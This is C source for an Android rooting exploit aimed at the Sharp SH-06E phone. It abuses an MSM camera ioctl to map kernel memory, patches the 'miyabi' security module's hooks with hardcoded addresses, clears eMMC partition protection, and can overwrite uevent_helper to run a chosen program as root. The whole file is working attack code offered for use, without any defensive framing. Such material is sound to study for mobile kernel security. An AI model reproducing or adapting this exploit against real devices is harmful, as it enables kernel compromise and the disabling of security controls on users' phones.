/*****************************************************************************
 * sh06e_root.c : Root SH-06E, need android.permission.CAMERA.
 *****************************************************************************
 * Copyright (C) 2013 Ming Hu <tewilove@gmail.com>
 * $Id$
 *
 * Authors: Ming Hu <tewilove@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation; either version 2.1 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
 *****************************************************************************/

#include <android/log.h>

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define LTAG "GUHEIHEI"
#ifndef _NDEBUG
#ifndef BUILD_SHARED_LIBRARY
#define LOGD(fmt, ...) do { __android_log_print(ANDROID_LOG_VERBOSE, LTAG, fmt, ##__VA_ARGS__); } while (0)
#else
#define LOGD(fmt, ...) do { fprintf(stderr, fmt"\n", ##__VA_ARGS__); fflush(stderr); } while (0)
#endif
#else
#define LOGD(fmt, ...)
#endif

#define MSM_CAM_IOCTL_MAGIC 'm'

struct msm_mem_map_info {
    uint32_t cookie;
    uint32_t length;
    uint32_t mem_type;
};

#define MSM_CAM_IOCTL_SET_MEM_MAP_INFO \
        _IOR(MSM_CAM_IOCTL_MAGIC, 41, struct msm_mem_map_info *)

#define MSM_MEM_MMAP 0


static void memsave(const char *f, const void *addr, int size) {
    int fd, n, c, rc;
    
    LOGD("memsave: file = %s, size = %08x", f, size);
    fd = open(f, O_CREAT | O_WRONLY);
    if (fd < 0) {
        LOGD("open() failed: %s.", strerror(errno));
        return;
    }
    n = 0;
    while (n < size) {
        c = size - n;
        if (c > 65536) c = 65536;
        rc = write(fd, (char *) addr + n, size - n);
        if (rc <= 0) break;
        n += rc;
        LOGD("memsave: write %08x.", rc);
    }
    if (n != size)
        LOGD("write() failed: %s.", strerror(errno));
    close(fd);
}

// sh06e 1.0.01
// uevent_helper c10312b0
// miyabi_security_ops c082d0b8
// take a look from kernel source, default_security_ops is totally disabled
// TODO: manual for now, should be able to rebuild kallsyms

struct miyabi_security_patch {
    int index;
    unsigned long old_value;
    unsigned long new_value;
};

static unsigned long addr_uevent_helper = 0xc10312b0;
static unsigned long addr_miyabi_security_ops = 0xc082d0b8;
static unsigned long addr_mmc_protect_part = 0xc086aa1c;

static struct miyabi_security_patch preset[] = {
    {3, 0xc0262848, 0xc02603fc},   // miyabi_ptrace_access_check
    {4, 0xc0262850, 0xc0260494},   // miyabi_ptrace_traceme
    {13, 0xc0263180, 0xc026085c},  // miyabi_bprm_set_creds
    {25, 0xc0262fa8, 0xc0262538},  // miyabi_sb_mount
    {26, 0xc026298c, 0xc0262540},  // miyabi_sb_umount
    {27, 0xc0262e14, 0xc0262548},  // miyabi_sb_pivotroot
    {36, 0xc0262e94, 0xc0262630},  // miyabi_path_symlink
    {37, 0xc0262858, 0xc0262638},  // miyabi_path_link
    {39, 0xc02628f8, 0xc0262650},  // miyabi_path_chmod
    {41, 0xc0262d94, 0xc0262660},  // miyabi_path_chroot
    {80, 0xc02629f8, 0xc02626b4},  // miyabi_dentry_open
    {90, 0xc0262860, 0xc0260da4},  // miyabi_task_fix_setuid
    {0, 0, 0},
}; 


int main(int argc, char **argv) {
    int rc, i, gd1, gd2, ng, fd_conf, fd_video0;
    struct msm_mem_map_info args;
    unsigned long kaddr, ksize, koffs, *vaddr, test;
    void *mapped;
    char *uehelper;
    struct miyabi_security_patch *p;

    uehelper = argc > 1 ? argv[1] : 0;
    LOGD("start.");
    fd_video0 = open("/dev/video0", O_RDWR);
    if (fd_video0 < 0) {
        LOGD("open() failed: %s.", strerror(errno));
        return -1;
    }
    fd_conf = open("/dev/msm_camera/config0", O_RDWR);
    if (fd_conf < 0) {
        LOGD("open() failed: %s.", strerror(errno));
        close(fd_video0);
        return -1;
    }
    ksize = 32 * 1024 * 1024;
    kaddr = 0x80000000;
    koffs = 0x00200000;
    args.cookie = kaddr;
    args.length = ksize;
    args.mem_type = MSM_MEM_MMAP;
    rc = ioctl(fd_conf, MSM_CAM_IOCTL_SET_MEM_MAP_INFO, &args);
    if (rc < 0) {
        close(fd_conf);
        close(fd_video0);
        return -1;
    }
    mapped = mmap(0, ksize, PROT_READ | PROT_WRITE, MAP_SHARED, fd_conf, kaddr);
    if (mapped == MAP_FAILED) {
        LOGD(" mmap() failed: %s.", strerror(errno));
    }
    vaddr = (unsigned long *)((char *) mapped + koffs + (addr_miyabi_security_ops - 0xc0000000));
    if (memcmp(vaddr, "miyabi", 6) == 0) {
        LOGD("patch miyabi.");
        for (i = 0, p = &preset[0], gd1 = gd2 = ng = 0; p->index; i++, p++) {
            test = vaddr[p->index];
            if (test == p->old_value) {
                vaddr[p->index] = p->new_value;
                gd1 += 1;
            } else if (test == p->new_value) {
                gd2 += 1;
            } else {
                ng += 1;
                LOGD(" mismatch %d.", p->index);
            }
        }
        if (gd1 == i)
            LOGD(" patched!!!");
        else if (gd2 == i)
            LOGD(" already patched.");
        else if (ng < i)
            LOGD(" partial patched!!!");
        else
            LOGD(" not patched.");
    }
    LOGD("clear mmc_protect_part.");
    vaddr = (unsigned long *)((char *) mapped + koffs + (addr_mmc_protect_part - 0xc0000000));
    for (i = 0; i < 14; i++) {
        *(vaddr + i * 2 + 1) = 0;
    }
    if (uehelper) {
        LOGD("set uevent_helper to %s.", uehelper);
        vaddr = (unsigned long *)((char *) mapped + koffs + (addr_uevent_helper - 0xc0000000));
        strncpy((char *) vaddr, uehelper, 256);
    }
    msync(mapped, ksize, MS_SYNC);
    munmap(mapped, ksize);
    close(fd_conf);
    close(fd_video0);
    LOGD("exit.");
    return 0;
}

